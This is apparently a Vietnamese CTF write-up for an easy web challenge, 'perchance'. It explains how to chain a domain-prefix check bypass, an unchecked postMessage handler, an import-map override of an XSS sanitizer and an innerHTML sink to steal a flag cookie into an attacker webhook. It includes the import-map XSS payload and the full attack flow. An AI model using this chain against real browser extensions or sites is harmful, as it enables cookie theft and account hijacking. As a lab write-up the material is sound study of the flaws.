---
title: perchance
date: 2026-09-27
ctf: NNS CTF
category: web
difficulty: easy
---

## Đề bài 
perchance

File: [web_perchance.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_perchance.tar.gz)
>Hint: `doc.rust-lang.org` itself is out of scope!

## Solution
Đây là challenge **client-side / browser-extension XSS**. Bot (Playwright + Firefox) mang sẵn cookie `flag` gắn với `doc.rust-lang.org` (path `/stable/std/`, **không** `httpOnly`). Ta phải chạy JS trong ngữ cảnh `doc.rust-lang.org` để đọc `document.cookie` rồi exfil. Chuỗi khai thác ghép **4 bug**.

### Bug 1 — Domain-prefix confusion (server)

```ts!
if (!url || !url.startsWith('https://doc.rust-lang.org')) {   // (!) thiếu dấu '/'
  return Response.json({ ok: false, error: 'Bad url' }, { status: 400 });
}
await runBrowser(url);
```

Thiếu `/` cuối nên `https://doc.rust-lang.org.<attacker>/` vẫn qua → ép bot mở thẳng **trang attacker**, ta có full JS. (Hint đề: `doc.rust-lang.org` itself is out of scope → phải dùng subdomain kiểu này.)

### Bug 2 — Điều khiển `activateOn` (options.js postMessage)

`web_accessible_resources: ["*"]` + UUID cố định → nhúng được `moz-extension://<uuid>/options.html`. `options.js` **không kiểm tra `e.origin`**, chỉ cần chuỗi *chứa* `https://doc.rust-lang.org/`, rồi lưu **`u.origin`** làm `activateOn`:

```js!
window.addEventListener('message', (e) => {         // không check origin
  if (e.data.match(/^https?/)) updateConfig(e.data);
});
// updateConfig: if (!u.href.includes('https://doc.rust-lang.org/')) return;
//               browser.storage.local.set({ activateOn: u.origin });
```

- Gửi `"<OUR_ORIGIN>/https://doc.rust-lang.org/"` → `activateOn = OUR_ORIGIN` (tiêm `cs.js` vào trang attacker).
- Gửi `"https://doc.rust-lang.org/"` → reset để tiêm `cs.js` vào trang docs thật.

### Bug 3 — Bypass js-xss bằng import map (ghi `previous` thô)

`cs.js` lưu `previous = window[nonce](location.href)`, với `window[nonce]` là default export của `http://localhost:3000/jsxss.js` (đáng lẽ là `filterXSS`). `nonce` ngẫu nhiên nhưng **specifier import là URL tuyệt đối cố định** → đặt sẵn **import map** trong top frame để remap:

```html!
<script type="importmap">
{ "imports": { "http://localhost:3000/jsxss.js":
    "data:text/javascript,export default ()=> \"<img src=x onerror=EXFIL>\"" } }
</script>
```

→ `default` không còn là `filterXSS` mà là hàm trả HTML thô → `previous` chứa payload chưa qua sanitizer (background `updateLastUrl` cũng không check `sender`).

### Bug 4 — innerHTML sink → XSS trên `doc.rust-lang.org`

Khi `cs.js` chạy trên trang docs thật:

```js!
elm.innerHTML = 'Previous: ' + previous;   // (!) SINK
```

`<img onerror>` do content script tạo là node DOM thật của trang → inline handler **chạy trong world của `doc.rust-lang.org`**. Trang ở `/stable/std/` nên `document.cookie` chứa cookie `flag` (non-httpOnly) → đọc và exfil về server attacker.

### Luồng hoàn chỉnh

```!
POST /perchance  perchance=https://doc.rust-lang.org.<attacker>/         (Bug 1)
 └─ bot mở trang attacker
     1) iframe options.html + postMessage -> activateOn = OUR_ORIGIN     (Bug 2)
     2) iframe khớp URL -> onCompleted -> cs.js tiêm vào top frame
          import module đã remap -> previous = "<img onerror=exfil>" thô (Bug 3)
     3) postMessage -> activateOn = "https://doc.rust-lang.org"          (Bug 2)
     4) location = https://doc.rust-lang.org/stable/std/index.html
          -> cs.js -> innerHTML previous -> onerror chạy trong world     (Bug 4)
             doc.rust-lang.org -> đọc cookie flag -> gửi về attacker
```

Trang khai thác: xem `solve/index.html` (sửa `ATTACKER_HOST` thành webhook của bạn, host tại domain dạng `doc.rust-lang.org.<something>` qua HTTPS, rồi submit URL đó vào `/perchance`). Cookie `flag` về webhook sau ~40s.

->Flag: `NNS{...}` (giá trị thật lấy từ biến môi trường `FLAG` của instance online — xem `process.env.FLAG` trong `src/browser.ts`)
